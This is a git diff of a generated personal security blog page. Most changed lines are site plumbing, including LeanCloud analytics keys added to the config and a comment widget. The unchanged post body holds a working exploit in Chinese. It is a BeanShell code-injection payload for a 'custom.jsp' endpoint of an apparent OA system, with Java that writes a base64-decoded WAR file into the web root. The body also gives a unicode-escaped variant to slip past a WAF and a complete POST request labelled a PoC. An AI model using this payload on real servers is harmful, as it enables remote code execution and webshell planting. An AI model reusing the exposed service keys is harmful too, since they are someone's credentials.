@@ -67,11 +67,11 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZyJbAKYmfgJXZGNkDKKBRC0i-gzGzoHsz","app_key":"WXTmIgfHD2JkbhooWMtgYW3C","server_url":"https://zyjbakym.lc-cn-n1-shared.com","path":"window.location.pathname"}},"search_path":"/local-search.xml"};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.3.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 
 <body>
@@ -231,9 +231,9 @@
   
     
 
-      <span id="busuanzi_container_page_pv" style="display: none">
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
         <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
+        <span id="leancloud-page-views"></span> 次
       </span>
     
   
@@ -283,6 +283,7 @@
 <p>如果waf拦截，可以将代码转为unicode</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">import java.lang.*;import java.io.*;Class cls=Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;bsh.Interpreter&quot;</span>);String path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File f=new File(path.split(<span class="hljs-string">&quot;WEB-INF&quot;</span>)[0]+<span class="hljs-string">&quot;../yourproject.war&quot;</span>);f.createNewFile();FileOutputStream fout=new FileOutputStream(f);fout.write(new sun.misc.BASE64Decoder().decodeBuffer<br></code></pre></div></td></tr></table></figure>
 
+
 <p><img src="/images/82/2GZtMuY6DFjy8jvP659rrKH3OgRKjRTN1ziFcWh1Mk0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>发送完整poc：</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1<br>Cache-Control: no-cache<br>Pragma: no-cache<br>User-Agent: Java/1.8.0_241<br>Host: 0.0.0.0<br>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<br>Connection: keep-alive<br>Content-type: application/x-www-form-urlencoded<br>Content-Length: 6044<br><br>var=&#123;<span class="hljs-string">&quot;body&quot;</span>:&#123;<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/sys/common/dataxml.jsp&quot;</span>&#125;&#125;&amp;s_bean=sysFormulaValidate&amp;script=%5cu0069%5cu006d%5cu0070%5cu006f%5cu0072%5cu0074%5cu0020%5cu006a%5cu0061%5cu0076%5cu0061%5cu002e%5cu006c%5cu0061%5cu006e%5cu0067%5cu002e%5cu002a%5cu003b%5cu0069%5cu006d%5cu0070%5cu006f%5cu0072%5cu0074%5cu0020%5cu006a%5cu0061%5cu0076%5cu0061%5cu002e%5cu0069%5cu006f%5cu002e%5cu002a%5cu003b%5cu0043%5cu006c%5cu0061%5cu0073%5cu0073%5cu0020%5cu0063%5cu006c%5cu0073%5cu003d%5cu0054%5cu0068%5cu0072%5cu0065%5cu0061%5cu0064%5cu002e%5cu0063%5cu0075%5cu0072%5cu0072%5cu0065%5cu006e%5cu0074%5cu0054%5cu0068%5cu0072%5cu0065%5cu0061%5cu0064%5cu0028%5cu0029%5cu002e%5cu0067%5cu0065%5cu0074%5cu0043%5cu006f%5cu006e%5cu0074%5cu0065%5cu0078%5cu0074%5cu0043%5cu006c%5cu0061%5cu0073%5cu0073%5cu004c%5cu006f%5cu0061%5cu0064%5cu0065%5cu0072%5cu0028%5cu0029%5cu002e%5cu006c%5cu006f%5cu0061%5cu0064%5cu0043%5cu006c%5cu0061%5cu0073%5cu0073%5cu0028%5cu0022%5cu0062%5cu0073%5cu0068%5cu002e%5cu0049%5cu006e%5cu0074%5cu0065%5cu0072%5cu0070%5cu0072%5cu0065%5cu0074%5cu0065%5cu0072%5cu0022%5cu0029%5cu003b%5cu0053%5cu0074%5cu0072%5cu0069%5cu006e%5cu0067%5cu0020%5cu0070%5cu0061%5cu0074%5cu0068%5cu003d%5cu0063%5cu006c%5cu0073%5cu002e%5cu0067%5cu0065%5cu0074%5cu0050%5cu0072%5cu006f%5cu0074%5cu0065%5cu0063%5cu0074%5cu0069%5cu006f%5cu006e%5cu0044%5cu006f%5cu006d%5cu0061%5cu0069%5cu006e%5cu0028%5cu0029%5cu002e%5cu0067%5cu0065%5cu0074%5cu0043%5cu006f%5cu0064%5cu0065%5cu0053%5cu006f%5cu0075%5cu0072%5cu0063%5cu0065%5cu0028%5cu0029%5cu002e%5cu0067%5cu0065%5cu0074%5cu004c%5cu006f%5cu0063%5cu0061%5cu0074%5cu0069%5cu006f%5cu006e%5cu0028%5cu0029%5cu002e%5cu0067%5cu0065%5cu0074%5cu0050%5cu0061%5cu0074%5cu0068%5cu0028%5cu0029%5cu003b%5cu0046%5cu0069%5cu006c%5cu0065%5cu0020%5cu0066%5cu003d%5cu006e%5cu0065%5cu0077%5cu0020%5cu0046%5cu0069%5cu006c%5cu0065%5cu0028%5cu0070%5cu0061%5cu0074%5cu0068%5cu002e%5cu0073%5cu0070%5cu006c%5cu0069%5cu0074%5cu0028%5cu0022%5cu0057%5cu0045%5cu0042%5cu002d%5cu0049%5cu004e%5cu0046%5cu0022%5cu0029%5cu005b%5cu0030%5cu005d%5cu002b%5cu0022%5cu002e%5cu002e%5cu002f%5cu0079%5cu006f%5cu0075%5cu0072%5cu0070%5cu0072%5cu006f%5cu006a%5cu0065%5cu0063%5cu0074%5cu002e%5cu0077%5cu0061%5cu0072%5cu0022%5cu0029%5cu003b%5cu0066%5cu002e%5cu0063%5cu0072%5cu0065%5cu0061%5cu0074%5cu0065%5cu004e%5cu0065%5cu0077%5cu0046%5cu0069%5cu006c%5cu0065%5cu0028%5cu0029%5cu003b%5cu0046%5cu0069%5cu006c%5cu0065%5cu004f%5cu0075%5cu0074%5cu0070%5cu0075%5cu0074%5cu0053%5cu0074%5cu0072%5cu0065%5cu0061%5cu006d%5cu0020%5cu0066%5cu006f%5cu0075%5cu0074%5cu003d%5cu006e%5cu0065%5cu0077%5cu0020%5cu0046%5cu0069%5cu006c%5cu0065%5cu004f%5cu0075%5cu0074%5cu0070%5cu0075%5cu0074%5cu0053%5cu0074%5cu0072%5cu0065%5cu0061%5cu006d%5cu0028%5cu0066%5cu0029%5cu003b%5cu0066%5cu006f%5cu0075%5cu0074%5cu002e%5cu0077%5cu0072%5cu0069%5cu0074%5cu0065%5cu0028%5cu006e%5cu0065%5cu0077%5cu0020%5cu0073%5cu0075%5cu006e%5cu002e%5cu006d%5cu0069%5cu0073%5cu0063%5cu002e%5cu0042%5cu0041%5cu0053%5cu0045%5cu0036%5cu0034%5cu0044%5cu0065%5cu0063%5cu006f%5cu0064%5cu0065%5cu0072%5cu0028%5cu0029%5cu002e%5cu0064%5cu0065%5cu0063%5cu006f%5cu0064%5cu0065%5cu0042%5cu0075%5cu0066%5cu0066%5cu0065%5cu0072(<span class="hljs-string">&quot;base64后的war包&quot;</span>));fout.close();&amp;<span class="hljs-built_in">type</span>=int&amp;modelName=<span class="hljs-built_in">test</span><br></code></pre></div></td></tr></table></figure>
@@ -292,6 +293,7 @@
             <hr>
             <div>
               <div class="post-metas mb-3">
+
                 
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
@@ -309,6 +311,16 @@
                   </div>
                 
               </div>
+              <hr>
+              <script src="https://utteranc.es/client.js"
+        repo="novysodope/novysodope.github.io"
+        issue-term="title"
+        label="Comment"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+<hr>
               
                 <p class="note note-warning">
                   
@@ -341,6 +353,7 @@
                 </div>
               
             </div>
+
 
             
           </article>
@@ -468,8 +481,8 @@
 
 
 
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
+  <script defer src="/js/leancloud.js" ></script>
 
 
 
